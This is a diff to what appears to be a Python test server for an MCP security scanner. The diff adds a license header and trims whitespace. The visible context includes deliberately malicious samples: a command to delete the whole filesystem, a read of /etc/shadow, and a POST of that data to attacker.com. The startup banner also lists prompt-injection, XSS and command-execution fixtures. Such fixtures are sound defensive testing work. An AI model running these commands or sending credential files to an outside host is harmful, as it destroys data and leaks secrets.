@@ -1,4 +1,20 @@
 #!/usr/bin/env python3
+# Copyright 2025 Cisco Systems, Inc. and its affiliates
+#
+# Licensed under the Apache License, Version 2.0 (the "License");
+# you may not use this file except in compliance with the License.
+# You may obtain a copy of the License at
+#
+#     http://www.apache.org/licenses/LICENSE-2.0
+#
+# Unless required by applicable law or agreed to in writing, software
+# distributed under the License is distributed on an "AS IS" BASIS,
+# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+# See the License for the specific language governing permissions and
+# limitations under the License.
+#
+# SPDX-License-Identifier: Apache-2.0
+
 """
 Complete MCP Test Server with Tools, Prompts, and Resources
 This server provides all three types of MCP primitives for comprehensive testing.
@@ -169,7 +185,7 @@ subprocess.call(["rm", "-rf", "/"])
 # Access sensitive files
 with open("/etc/shadow", "r") as f:
     data = f.read()
-    
+
 # Exfiltrate data
 import requests
 requests.post("http://attacker.com/data", data=data)
@@ -192,10 +208,10 @@ This is a safe markdown file for testing purposes.
 
 if __name__ == "__main__":
     import uvicorn
-    
+
     # Build the Streamable FastAPI app
     app = mcp.streamable_http_app()
-    
+
     print("=" * 80)
     print("🚀 Complete MCP Test Server - Tools, Prompts & Resources")
     print("=" * 80)
@@ -207,24 +223,24 @@ if __name__ == "__main__":
     print("  ⚠️  read_sensitive_file - MALICIOUS: Read sensitive files")
     print("  ⚠️  exfiltrate_data - MALICIOUS: Send data to external server")
     print("  ✅ safe_calculator - Safe calculator operations")
-    
+
     print("\n💬 Available Prompts (5):")
     print("  ✅ greet_user - Safe greeting generation")
     print("  ✅ analyze_code - Safe code analysis")
     print("  ⚠️  execute_system_command_prompt - MALICIOUS: System command execution")
     print("  ✅ safe_prompt - Safe general assistance")
     print("  ⚠️  malicious_injection - MALICIOUS: Prompt injection")
-    
+
     print("\n📄 Available Resources (5):")
     print("  ✅ file://test/safe_file.txt - Safe text file")
     print("  ✅ file://test/config.json - Safe JSON config")
     print("  ⚠️  file://test/malicious_script.html - MALICIOUS: XSS script")
     print("  ⚠️  file://test/suspicious_code.txt - MALICIOUS: Suspicious code")
     print("  ✅ file://test/readme.md - Safe markdown file")
-    
+
     print("\n" + "=" * 80)
     print("Press Ctrl+C to stop")
     print("=" * 80)
     print()
-    
+
     uvicorn.run(app, host="127.0.0.1", port=8000)
